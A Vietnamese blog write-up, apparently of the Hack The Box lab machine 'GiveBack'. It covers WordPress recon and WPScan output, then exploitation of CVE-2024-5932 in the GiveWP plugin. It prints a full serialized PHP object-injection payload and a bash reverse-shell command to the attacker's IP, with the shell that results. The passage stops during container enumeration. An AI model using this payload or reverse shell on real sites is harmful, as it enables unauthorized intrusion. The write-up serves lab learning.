---
layout: post
title: "GiveBack"
date: 2026-02-03 10:00:00 +0700
tags: redteam Machine-Medium Linux
categories: jekyll update
--- 

## Recon

---

Thực hiện scan Nmap. 

![image](/assets/images/HTB/season9/Giveback/image%201.png)

Kết quả scan Nmap

Từ đây nhìn thấy đang mở port **`80`** → web; dùng **`ngnix 1.28.0`** và **`WordPress 6.8.1`** và port **`22`** → ssh.

Mình add ip → **`/etc/host`** 

Sau đó mình truy cập qua trình duyệt. 

![image](/assets/images/HTB/season9/Giveback/image%202.png)

Giao diện web ban đầu

Thì thử tìm mọi thứ liên quan đến web này bắt đầu từ file **`robots.txt`** trước. 

![image](/assets/images/HTB/season9/Giveback/image%203.png)

Truy cập file robots.txt 

Nhìn thấy thì ko được truy cập **`/wp-admin`** mà cho phép **`/wp-admin/admin-ajax.php`** và một link sitemap.

![image](/assets/images/HTB/season9/Giveback/image%204.png)

Link XML Sitemap 

Thì mình đã lụm được 5 url và sẽ phải khám phá từng cái xem có gì. 

- **`http://giveback.htb/wp-sitemap-posts-1.xml` ⇒ `http://giveback.htb/2024/09/hello-world`**
    
    ![image](/assets/images/HTB/season9/Giveback/image%205.png)
    
    Truy cập mình được dẫn đến như sau.
    
    ![image](/assets/images/HTB/season9/Giveback/image%206.png)
    
- **`http://giveback.htb/wp-sitemap-posts-1.xml`** ⇒ 5 url khác.
    
    ![image](/assets/images/HTB/season9/Giveback/image%207.png)
    
    - **`http://giveback.htb`** ⇒ trang web lúc đầu
    - **`http://giveback.htb/sample-page/`**
        
        ![image](/assets/images/HTB/season9/Giveback/image%208.png)
        
    - **`http://giveback.htb/donation-confirmation`**
        
        ![image](/assets/images/HTB/season9/Giveback/image%209.png)
        
    - **`http://giveback.htb/donation-failed/`**
        
        ![image](/assets/images/HTB/season9/Giveback/image%2010.png)
        
    - **`http://giveback.htb/dornor-dashboard/`**
        
        ![image](/assets/images/HTB/season9/Giveback/image%2011.png)
        
- **`http://giveback.htb/wp-sitemap-posts-give_forms-1.xml` ⇒ `http://giveback.htb/the-things-we-need`**
    
    ![image](/assets/images/HTB/season9/Giveback/image%2012.png)
    
    Truy cập được dẫn đến như sau. 
    
    ![image](/assets/images/HTB/season9/Giveback/image%2013.png)
    
- **`http://giveback.htb/wp-sitemap-taxonomies-category-1.xml` ⇒ `http://giveback.htb/category/uncategorized/`**
    
    ![image](/assets/images/HTB/season9/Giveback/image%2014.png)
    
    Truy cập được dẫn đến. 
    
    ![image](/assets/images/HTB/season9/Giveback/image%2015.png)
    
- **`http://giveback.htb/wp-sitemap-users-1.xml` ⇒ `http://giveback.htb/author/user/`**
    
    ![image](/assets/images/HTB/season9/Giveback/image%2016.png)
    
    Mình được dẫn tới đây. 
    
    ![image](/assets/images/HTB/season9/Giveback/image%2017.png)
    

Giờ thì mình phân tích và chú ý với những gì mình đã liệt kê ở trên.

- **`http://giveback.htb/the-things-we-need`**
    
    Đây là trang cho phép người khác thực hiện donate. 
    
    ![image](/assets/images/HTB/season9/Giveback/image%2018.png)
    
    ![image](/assets/images/HTB/season9/Giveback/image%2019.png)
    

![image](/assets/images/HTB/season9/Giveback/image%2020.png)

![image](/assets/images/HTB/season9/Giveback/image%2021.png)

Mình test thử chức năng donate → tui đã thử với 100$

![image](/assets/images/HTB/season9/Giveback/image%2022.png)

Sau khi đã donate thì mình để 1 link phía dưới **`Go to my Dashboard` →** sẽ được chuyển về **`Donor Dashboard`** 

![image](/assets/images/HTB/season9/Giveback/image%2023.png)

- **`http://giveback.htb/dornor-dashboard`**
    
    ![image](/assets/images/HTB/season9/Giveback/image%2024.png)
    
    Mình cần cung cấp 1 email mà có thể sử dụng được, nhưng mà cũng thử dùng **`ho4ngphwc@ho4ngphwc.com`** xem nó response về gì. (Unable to send Email) 
    
    → Nên mình quay lại chỗ cái post tại **`category/uncategorized/`**
    
- **`http://giveback.htb/category/uncategorized/`**
    
    ![image](/assets/images/HTB/season9/Giveback/image%2025.png)
    
    ![image](/assets/images/HTB/season9/Giveback/image%2026.png)
    
    Khi mình trỏ tới **`admin-person`** → thì nó hiển thị **`wyrmlandia.org.nz.thing.edu`** 
    

## WPScan

---

Để khi scan bằng wpscan có kết quả tốt nhất thì mình nên signup account để nhận api-key.

```bash
**┌──(kali㉿kali)-[~/Desktop]
└─$ wpscan --url http://giveback.htb/ --api-token kk2xxxxxxxxxxxxxxxxxxxxxx5Wj39b0NaFiihI --enumerate
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://giveback.htb/ [10.10.11.94]
[+] Started: Tue Dec  2 16:15:19 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.28.0
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://giveback.htb/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] WordPress readme found: http://giveback.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 6.8.1 identified (Insecure, released on 2025-04-30).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://giveback.htb/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.1'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://giveback.htb/, Match: 'WordPress 6.8.1'
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
 |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
 |
 | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
 |     Fixed in: 6.8.3
 |     References:
 |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
 |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
 |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/

[+] WordPress theme in use: bizberg
 | Location: http://giveback.htb/wp-content/themes/bizberg/
 | Latest Version: 4.2.9.79 (up to date)
 | Last Updated: 2024-06-09T00:00:00.000Z
 | Readme: http://giveback.htb/wp-content/themes/bizberg/readme.txt
 | Style URL: http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1
 | Style Name: Bizberg
 | Style URI: https://bizbergthemes.com/downloads/bizberg-lite/
 | Description: Bizberg is a perfect theme for your business, corporate, restaurant, ingo, ngo, environment, nature,...
 | Author: Bizberg Themes
 | Author URI: https://bizbergthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 4.2.9.79 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://giveback.htb/wp-content/themes/bizberg/style.css?ver=6.8.1, Match: 'Version: 4.2.9.79'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] give
 | Location: http://giveback.htb/wp-content/plugins/give/
 | Last Updated: 2025-11-18T14:37:00.000Z
 | [!] The version is out of date, the latest version is 4.13.1
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Meta Tag (Passive Detection)
 |  Javascript Var (Passive Detection)
 |
 | [!] 20 vulnerabilities identified:
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.14.2 - Missing Authorization to Authenticated (Subscriber+) Limited File Deletion
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/528b861e-64bf-4c59-ac58-9240db99ef96
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5941
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/824ec2ba-b701-46e9-b237-53cd7d0e46da
 |
 | [!] Title: GiveWP < 3.14.2 - Unauthenticated PHP Object Injection to RCE
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/fdf7a98b-8205-4a29-b830-c36e1e46d990
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5932
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93e2d007-8157-42c5-92ad-704dc80749a3
 |
 | [!] Title: GiveWP < 3.16.0 - Unauthenticated Full Path Disclosure
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/6ff11e50-188e-4191-be12-ab4bde9b6d27
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-6551
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/2a13ce09-b312-4186-b0e2-63065c47f15d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Authenticated (GiveWP Manager+) SQL Injection via order Parameter
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/aed98bed-b6ed-4282-a20e-995515fd43a1
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9130
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/4a3cae01-620d-405e-baf6-2d66a5b429b3
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.16.2 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.16.2
 |     References:
 |      - https://wpscan.com/vulnerability/c1807282-5f15-4b21-81b6-dcb8b03618bd
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-8353
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c4c530fa-eaf4-4721-bfb6-9fc06d7f343c
 |
 | [!] Title: GiveWP < 3.16.0 - Cross-Site Request Forgery
 |     Fixed in: 3.16.0
 |     References:
 |      - https://wpscan.com/vulnerability/582c6a46-486e-41ca-9c45-96dfe8b8ddbb
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-47315
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7ce9bac7-60bb-4880-9e37-4d71f02ee941
 |
 | [!] Title: GiveWP < 3.16.4 - Unauthenticated PHP Object Injection to Remote Code Execution
 |     Fixed in: 3.16.4
 |     References:
 |      - https://wpscan.com/vulnerability/793bdc97-69eb-43c3-aab0-c86a76285f36
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9634
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b8eb3aa9-fe60-48b6-aa24-7873dd68b47e
 |
 | [!] Title: Give < 3.19.0 - Reflected XSS
 |     Fixed in: 3.19.0
 |     References:
 |      - https://wpscan.com/vulnerability/5f196294-5ba9-45b6-a27c-ab1702cc001f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-11921
 |
 | [!] Title: GiveWP < 3.19.3 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.3
 |     References:
 |      - https://wpscan.com/vulnerability/571542c5-9f62-4e38-baee-6bbe02eec4af
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12877
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b2143edf-5423-4e79-8638-a5b98490d292
 |
 | [!] Title: GiveWP < 3.19.4 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.19.4
 |     References:
 |      - https://wpscan.com/vulnerability/82afc2f7-948b-495e-8ec2-4cd7bbfe1c61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-22777
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/06a7ff0b-ec6b-490c-9bb0-fbb5c1c337c4
 |
 | [!] Title: GiveWP < 3.20.0 - Unauthenticated PHP Object Injection
 |     Fixed in: 3.20.0
 |     References:
 |      - https://wpscan.com/vulnerability/e27044bd-daab-47e6-b399-de94c45885c5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0912
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8a8ae1b0-e9a0-4179-970b-dbcb0642547c
 |
 | [!] Title: Give < 3.22.1 - Missing Authorization to Unauthenticated Arbitrary Earning Reports Disclosure via give_reports_earnings Function
 |     Fixed in: 3.22.1
 |     References:
 |      - https://wpscan.com/vulnerability/ebe88626-2127-4021-aa8e-f2f47e12ad4f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2025
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/40595943-121d-4492-a0ed-f2de1bd99fda
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.22.2 - Authenticated (Subscriber+) Sensitive Information Exposure
 |     Fixed in: 3.22.2
 |     References:
 |      - https://wpscan.com/vulnerability/b331a81b-b7cc-4e0a-a088-26468a835cc5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-2331
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/b4d9acfb-bb9d-4b00-b439-c7ccea751f8d
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.3.1 - Missing Authorization To Authenticated (Contributor+) Campaign Data View And Modification
 |     Fixed in: 4.3.1
 |     References:
 |      - https://wpscan.com/vulnerability/f819ea85-bf28-4e8c-b72b-59741e7e9cee
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-4571
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8f03b4ef-e877-430e-a440-3af0feca818c
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.0 - Authenticated (GiveWP worker+) Stored Cross-Site Scripting
 |     Fixed in: 4.6.0
 |     References:
 |      - https://wpscan.com/vulnerability/fda8eaea-ca20-417a-896b-49c1fa0a1c07
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7205
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/39e501d8-88a0-4625-aeb0-aa33fc89a8d4
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.6.1 - Unauthenticated Donor Data Exposure
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/4739fdb8-9444-44b9-8e98-7a299e6fe186
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-8620
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/6dc7c5a6-513e-4aa8-9538-0ac6fb37c867
 |
 | [!] Title: GiveWP < 4.6.1 - Missing Authorization to Donation Update
 |     Fixed in: 4.6.1
 |     References:
 |      - https://wpscan.com/vulnerability/bdfb968d-df2b-43ed-9a9c-f9b15d8457f3
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-7221
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/8766608e-df72-4b9d-a301-a50c64fadc9a
 |
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 4.10.1 - Missing Authorization to Unauthenticated Forms-Campaign Association
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/5dccab73-e06f-4c01-837b-eddf42ea789d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11228
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ddf9a043-5eb6-46fd-88c2-0f5a04f73fc9
 |
 | [!] Title: GiveWP < 4.10.1 - Unauthenticated Forms and Campaigns Disclosure
 |     Fixed in: 4.10.1
 |     References:
 |      - https://wpscan.com/vulnerability/e7a291a5-3846-42e7-b4f2-7b2383326d4c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-11227
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/54db1807-69ff-445c-9e02-9abce9fd3940
 |
 | [!] Title: GiveWP < 4.13.1 - Unauthenticated Stored XSS via 'name'
 |     Fixed in: 4.13.1
 |     References:
 |      - https://wpscan.com/vulnerability/c03133b5-80f0-4d70-ad22-5dbd7e290031
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13206
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/95823720-e1dc-46c1-887b-ffd877b2fbe5
 |
 | Version: 3.14.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://giveback.htb/wp-content/plugins/give/assets/dist/css/give.css?ver=3.14.0
 | Confirmed By:
 |  Meta Tag (Passive Detection)
 |   - http://giveback.htb/, Match: 'Give v3.14.0'
 |  Javascript Var (Passive Detection)
 |   - http://giveback.htb/, Match: '"1","give_version":"3.14.0","magnific_options"'

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:03:31 <===============================================================> (652 / 652) 100.00% Time: 00:03:31
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:14:06 <=============================================================> (2575 / 2575) 100.00% Time: 00:14:06

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:43 <================================================================> (137 / 137) 100.00% Time: 00:00:43

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:23 <======================================================================> (75 / 75) 100.00% Time: 00:00:23

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:30 <===========================================================> (100 / 100) 100.00% Time: 00:00:30

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:08 <=================================================================> (10 / 10) 100.00% Time: 00:00:08

[i] User(s) Identified:

[+] user
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://giveback.htb/wp-json/wp/v2/users/?per_page=100&page=1
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://giveback.htb/wp-json/oembed/1.0/embed?url=http://giveback.htb/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - http://giveback.htb/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 5
 | Requests Remaining: 20

[+] Finished: Tue Dec  2 16:35:44 2025
[+] Requests Done: 3608
[+] Cached Requests: 12
[+] Data Sent: 997.523 KB
[+] Data Received: 1.635 MB
[+] Memory used: 287.426 MB
[+] Elapsed time: 00:20:24**
```

Nhìn thấy nó in ra 1 loạt kết quả.

Nhưng mà mình cần chú ý các kết quả sau:

- plugin **`give`**

Mình cần check devtool xem có version hay ko? 

![image](/assets/images/HTB/season9/Giveback/image%2027.png)

Xác định web đang dùng plugin version **`3.14.0` → có thể liên quan đến 2 CVEs này.** 

```bash
**<SNIP>
 | [!] Title: GiveWP – Donation Plugin and Fundraising Platform < 3.14.2 - Missing Authorization to Authenticated (Subscriber+) Limited File Deletion
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/528b861e-64bf-4c59-ac58-9240db99ef96
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5941
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/824ec2ba-b701-46e9-b237-53cd7d0e46da
 |
 | [!] Title: GiveWP < 3.14.2 - Unauthenticated PHP Object Injection to RCE
 |     Fixed in: 3.14.2
 |     References:
 |      - https://wpscan.com/vulnerability/fdf7a98b-8205-4a29-b830-c36e1e46d990
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5932
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/93e2d007-8157-42c5-92ad-704dc80749a3
 <SNIP>**
```

Nhưng nhìn kết quả trả về thì khá nhiều trên các version mới, nên mình thử trên 2 CVEs này trước nếu ko hoạt động thì mình đổi. 

Tổng quan về [CVE-2024-5941](https://www.wiz.io/vulnerability-database/cve/cve-2024-5941)

![image](/assets/images/HTB/season9/Giveback/image%2028.png)

Này nói về việc ko xác thực cho phép mình tiếp cận các file của người khác và xóa những file đó. → **có thể ko khai thác được.**

### CVE-2024-5932

---

Mình có các bài phân tích:

- [**Link 1**](https://viblo.asia/p/phan-tich-cve-2024-5932-lo-hong-php-object-injection-trong-givewp-wordpress-plugin-x7Z4DOG0VnX)
- [**Link 2**](https://www.skshieldus.com/download/files/download.do?o_fname=Research%20Technique_PHP%20Object%20Injection%20Vulnerability%20in%20WordPress%20GiveWP%20(CVE-2024-5932).pdf&r_fname=20240927174114070.pdf)

Đồng thời khi tìm kiếm trên mạng thì mình cũng tìm ra 1 POC: 

- https://github.com/EQSTLab/CVE-2024-5932

Mình sẽ mở 1 reverse shell bằng netcat. 

```bash
**┌──(env)─(kali㉿kali)-[~/Desktop/giveback/CVE-2024-5932]
└─$ nc -lvnp 4545          
listening on [any] 4545 ...**
```

Sau đó mình chạy PoC.

```python
**┌──(env)─(kali㉿kali)-[~/Desktop/giveback/CVE-2024-5932]
└─$ python3 CVE-2024-5932-rce.py -u http://giveback.htb/donations/the-things-we-need/ -c 'bash -c "bash -i >& /dev/tcp/10.10.16.72/4545 0>&1"'
                                                                                                                                                                                                                                                                                                            
             ..-+*******-                                                                                  
            .=#+-------=@.                        .:==:.                                                   
           .**-------=*+:                      .-=++.-+=:.                                                 
           +*-------=#=+++++++++=:..          -+:==**=+-+:.                                                
          .%----=+**+=-:::::::::-=+**+:.      ==:=*=-==+=..                                                
          :%--**+-::::::::::::::::::::+*=:     .::*=**=:.                                                  
   ..-++++*@#+-:::::::::::::::::::::::::-*+.    ..-+:.                                                     
 ..+*+---=#+::::::::::::::::::::::::::::::=*:..-==-.                                                       
 .-#=---**:::::::::::::::::::::::::=+++-:::-#:..            :=+++++++==.   ..-======-.     ..:---:..       
  ..=**#=::::::::::::::::::::::::::::::::::::%:.           *@@@@@@@@@@@@:.-#@@@@@@@@@%*:.-*%@@@@@@@%#=.    
   .=#%=::::::::::::::::::::::::::::::::-::::-#.           %@@@@@@@@@@@@+:%@@@@@@@@@@@%==%@@@@@@@@@@@%-    
  .*+*+:::::::::::-=-::::::::::::::::-*#*=::::#: ..*#*+:.  =++++***%@@@@+-@@@#====%@@@%==@@@#++++%@@@%-    
  .+#*-::::::::::+*-::::::::::::::::::+=::::::-#..#+=+*%-.  :=====+#@@@@-=@@@+.  .%@@@%=+@@@+.  .#@@@%-    
   .+*::::::::::::::::::::::::+*******=::::::--@.+@#+==#-. #@@@@@@@@@@@@.=@@@%*++*%@@@%=+@@@#====@@@@%-    
   .=+:::::::::::::=*+::::::-**=-----=#-::::::-@%+=+*%#:. .@@@@@@@@@@@%=.:%@@@@@@@@@@@#-=%@@@@@@@@@@@#-    
   .=*::::::::::::-+**=::::-#+--------+#:::-::#@%*==+*-   .@@@@#=----:.  .-+*#%%%%@@@@#-:+#%@@@@@@@@@#-    
   .-*::::::::::::::::::::=#=---------=#:::::-%+=*#%#-.   .@@@@%######*+.       .-%@@@#:  .....:+@@@@*:    
    :+=:::::::::::-:-::::-%=----------=#:::--%++++=**      %@@@@@@@@@@@@.        =%@@@#.        =@@@@*.    
    .-*-:::::::::::::::::**---------=+#=:::-#**#*+#*.      -#%@@@@@@@@@#.        -%@@%*.        =@@@@+.    
.::-==##**-:::-::::::::::%=-----=+***=::::=##+#=.::         ..::----:::.         .-=--.         .=+=-.     
%+==--:::=*::::::::::::-:+#**+=**=::::::-#%=:-%.                                                           
*+.......+*::::::::::::::::-****-:::::=*=:.++:*=                                                           
.%:..::::*@@*-::::::::::::::-+=:::-+#%-.   .#*#.                                                           
 ++:.....#--#%**=-:::::::::::-+**+=:@#....-+*=.                                                            
 :#:....:#-::%..-*%#++++++%@@@%*+-.#-=#+++-..                                                              
 .++....-#:::%.   .-*+-..*=.+@= .=+..-#                                                                    
 .:+++#@#-:-#= ...   .-++:-%@@=     .:#                                                                    
     :+++**##@#+=.      -%@@@%-   .-=*#.                                                                   
    .=+::+::-@:         #@@@@+. :+*=::=*-                                                                  
    .=+:-**+%%+=-:..    =*#*-..=*-:::::=*                                                                  
     :++---::--=*#+*+++++**+*+**-::::::+=                                                                  
      .+*=:::---+*:::::++++++*+=:::::-*=.                                                                  
       .:=**+====#*::::::=%:...-=++++=.      Author: EQST(Experts, Qualified Security Team)
           ..:----=**++++*+.                 Github: https://github.com/EQSTLab/CVE-2024-5932    

                                                                                                                                                                                                                                                                                                         
Analysis base : https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

=============================================================================================================    

CVE-2024-5932 : GiveWP unauthenticated PHP Object Injection
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.
Arbitrary File Deletion

============================================================================================================= 
    
[\] Exploit loading, please wait...
[+] Requested Data: 
{'give-form-id': '17', 'give-form-hash': 'aa0bd4b0e9', 'give-price-id': '0', 'give-amount': '$10.00', 'give_first': 'William', 'give_last': 'Leonard', 'give_email': 'kevin19@example.net', 'give_title': 'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:51:"bash -c "bash -i >& /dev/tcp/10.10.16.72/4545 0>&1"";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}', 'give-gateway': 'offline', 'action': 'give_process_donation'}**

```

Quay lại tab netcat 

```python
**┌──(kali㉿kali)-[~/Desktop/giveback/CVE-2024-5932]
└─$ nc -lvnp 4545
listening on [any] 4545 ...
connect to [10.10.16.72] from (UNKNOWN) [10.10.11.94] 8677
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
<-7bdd4896bc-wnvwx:/opt/bitnami/wordpress/wp-admin$ id
id
uid=1001 gid=0(root) groups=0(root),1001
<-7bdd4896bc-wnvwx:/opt/bitnami/wordpress/wp-admin$** 

```

Mình đã có quyền root nhưng khi kiểm tra thì có thể là docker container. Dấu hiệu rõ nhất là **`<-7bdd4896bc-wnvwx:/opt/bitnami/wordpress/wp-admin$`** 

```bash
**<-7bdd4896bc-wnvwx:/opt/bitnami/wordpress/wp-admin$ df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
overlay                             12G  8.0G  3.5G  70% /
tmpfs                               64M     0   64M   0% /dev
/dev/mapper/ubuntu--vg-ubuntu--lv   12G  8.0G  3.5G  70% /tmp
tmpfs                              1.2G   12K  1.2G   1% /secrets
shm                                 64M     0   64M   0% /dev/shm
tmpfs                              2.0G     0  2.0G   0% /proc/acpi
tmpfs                              2.0G     0  2.0G   0% /proc/scsi
tmpfs                              2.0G     0  2.0G   0% /sys/firmware
tmpfs                              2.0G     0  2.0G   0% /sys/devices/virtual/powercap**
 
```

Từ đây mình nhìn thấy **`overlay`** là nơi lưu trữ driver mặc định của Docker. 

Và hostname nhìn thấy có thể là cách đặt tên trong Kubernetes, và mình nhìn thấy mount **`/secrets`** 

Và xác định chắc chắn hơn nữa vì tại icon của machine thì tác giả đã hint. 

![image](/assets/images/HTB/season9/Giveback/image%2029.png)

Thì đây được hiểu là **`Lightweight Kubernetes`** - [**k3s**](https://github.com/k3s-io/k3s).

Nên giờ thì mình cần khai thác sâu hơn nữa. 

```bash
**<wordpress-7bdd4896bc-wnvwx:/opt/bitnami/wordpress$ ls -la 
ls -la
total 248
drwxrwsr-x  6 1001 1001  4096 Dec  8 04:49 .
drwxr-xr-x 10 root root  4096 Jun 20 08:14 ..
lrwxrwxrwx  1 1001 1001    43 Dec  8 04:48 .spdx-wordpress.json -> /opt/bitnami/wordpress/.spdx-wordpress.spdx
-rw-rw-r--  1 1001 1001  2875 Dec  8 04:48 .spdx-wordpress.spdx
-rw-rw-r--  1 1001 1001   405 Dec  8 04:48 index.php
-rw-rw-r--  1 1001 1001 19903 Dec  8 04:48 license.txt
drwxrwsr-x  2 1001 1001  4096 Dec  8 04:48 licenses
-rw-rw-r--  1 1001 1001  7425 Dec  8 04:48 readme.html
